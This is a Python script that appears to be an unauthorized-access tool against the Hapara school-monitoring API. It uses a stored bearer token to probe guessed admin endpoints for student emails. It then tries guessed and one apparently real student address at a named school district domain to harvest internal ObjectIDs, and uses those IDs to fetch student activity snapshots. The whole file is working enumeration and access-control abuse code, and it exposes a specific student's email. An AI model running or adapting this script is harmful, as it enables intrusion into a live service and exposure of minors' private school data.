#!/usr/bin/env python3
# hapara_student_discoverer.py

import requests
import json
import re
from typing import List, Dict, Any


def get_latest_token() -> str:
    """Get the latest access token"""
    with open("../auth_token.jsonl", 'r') as f:
        return json.loads(f.readlines()[-1])["access_token"]


def discover_student_emails_from_admin(token: str) -> List[str]:
    """Discover student emails from admin endpoints"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    # Try to get student list from various admin endpoints
    admin_endpoints = [
        "/admin/students/list",
        "/admin/students",
        "/api/admin/students",
        "/v1/admin/students",
        "/admin/config/students",
        "/students/list"
    ]

    student_emails = []

    for endpoint in admin_endpoints:
        url = f"https://api.hapara.com{endpoint}"
        print(f"🔍 Trying: {url}")

        try:
            response = requests.post(url, headers=headers, json={}, timeout=10)

            if response.status_code == 200:
                try:
                    data = response.json()
                    print(f"✅ Found data at {endpoint}")

                    # Try to extract emails from response
                    emails_found = extract_emails_from_data(data)
                    if emails_found:
                        student_emails.extend(emails_found)
                        print(f"📧 Found emails: {emails_found}")
                        break

                except json.JSONDecodeError:
                    # Look for emails in text response
                    emails_found = extract_emails_from_text(response.text)
                    if emails_found:
                        student_emails.extend(emails_found)
                        print(f"📧 Found emails in text: {emails_found}")
            else:
                print(f"❌ Status: {response.status_code}")

        except Exception as e:
            print(f"❌ Error: {str(e)}")

        print("-" * 50)

    return list(set(student_emails))  # Remove duplicates


def extract_emails_from_data(data: Any) -> List[str]:
    """Extract emails from JSON data"""
    emails = []

    if isinstance(data, list):
        for item in data:
            if isinstance(item, dict) and 'email' in item:
                emails.append(item['email'])
            elif isinstance(item, str) and '@' in item:
                emails.append(item)
    elif isinstance(data, dict):
        # Check common email fields
        for key in ['email', 'emails', 'student_email', 'user_email']:
            if key in data:
                if isinstance(data[key], list):
                    emails.extend([e for e in data[key] if isinstance(e, str) and '@' in e])
                elif isinstance(data[key], str) and '@' in data[key]:
                    emails.append(data[key])

        # Recursively search for emails
        for value in data.values():
            if isinstance(value, (dict, list)):
                emails.extend(extract_emails_from_data(value))

    return emails


def extract_emails_from_text(text: str) -> List[str]:
    """Extract emails from text using regex"""
    email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
    return re.findall(email_pattern, text)


def get_student_config(token: str, email: str) -> Dict[str, Any]:
    """Get student configuration including ObjectID"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    url = "https://api.hapara.com/admin/config/highlights"
    payload = {"emails": [email]}

    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data and len(data) > 0:
                return data[0]
    except Exception as e:
        print(f"❌ Error getting config for {email}: {e}")

    return {}


def find_working_objectids(token: str) -> List[Dict[str, Any]]:
    """Find working ObjectIDs from known students"""
    # Try known student emails from your school domain
    known_domains = ["fusdk12.net", "student.fusdk12.net", "fremont.k12.ca.us"]

    test_emails = [
        # Try pattern-based emails
        "rumnel567@fusdk12.net",  # From earlier discovery
        "test@fusdk12.net",
        "student@fusdk12.net",
        "admin@fusdk12.net",

        # Try common patterns
        "user123@fusdk12.net",
        "student001@fusdk12.net",
        "testuser@fusdk12.net",
    ]

    working_students = []

    for email in test_emails:
        print(f"🔍 Testing email: {email}")
        config = get_student_config(token, email)

        if config:
            student_id = config.get('ID')
            if student_id and len(student_id) == 24 and all(c in '0123456789abcdef' for c in student_id.lower()):
                print(f"✅ Found valid ObjectID: {student_id}")
                working_students.append({
                    "email": email,
                    "object_id": student_id,
                    "config": config
                })
            else:
                print(f"❌ No valid ObjectID found for {email}")
        else:
            print(f"❌ No config found for {email}")

        print("-" * 50)

    return working_students


def test_objectid_with_snapshots(token: str, object_id: str, email: str) -> bool:
    """Test if ObjectID works with snapshots endpoint"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    url = "https://api.hapara.com/hldata/student/snapshots"
    payload = {"id": object_id}

    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        works = response.status_code == 200
        print(f"📸 ObjectID {object_id} ({email}): {'✅ WORKS' if works else '❌ FAILS'}")
        if works:
            print(f"   Response: {response.json()}")
        return works
    except Exception as e:
        print(f"❌ Error testing {object_id}: {e}")
        return False


def main():
    print("[*] Hapara Student Discoverer")
    print("[*] Finding real student ObjectIDs\n")

    try:
        token = get_latest_token()
        print(f"🔑 Token: {token[:20]}...")

        # Step 1: Try to discover student emails
        print("\n" + "=" * 60)
        print("STEP 1: DISCOVERING STUDENT EMAILS")
        print("=" * 60)
        student_emails = discover_student_emails_from_admin(token)

        if student_emails:
            print(f"📧 Found student emails: {student_emails}")
        else:
            print("❌ No student emails found through admin endpoints")

        # Step 2: Find working ObjectIDs from known patterns
        print("\n" + "=" * 60)
        print("STEP 2: FINDING WORKING OBJECTIDS")
        print("=" * 60)
        working_students = find_working_objectids(token)

        if working_students:
            print(f"🎉 Found {len(working_students)} working students!")
            for student in working_students:
                print(f"   👤 {student['email']} -> {student['object_id']}")

            # Step 3: Test ObjectIDs with snapshots
            print("\n" + "=" * 60)
            print("STEP 3: TESTING OBJECTIDS WITH SNAPSHOTS")
            print("=" * 60)
            for student in working_students:
                test_objectid_with_snapshots(token, student['object_id'], student['email'])

        else:
            print("❌ No working ObjectIDs found")

    except Exception as e:
        print(f"❌ Error: {str(e)}")


if __name__ == "__main__":
    main()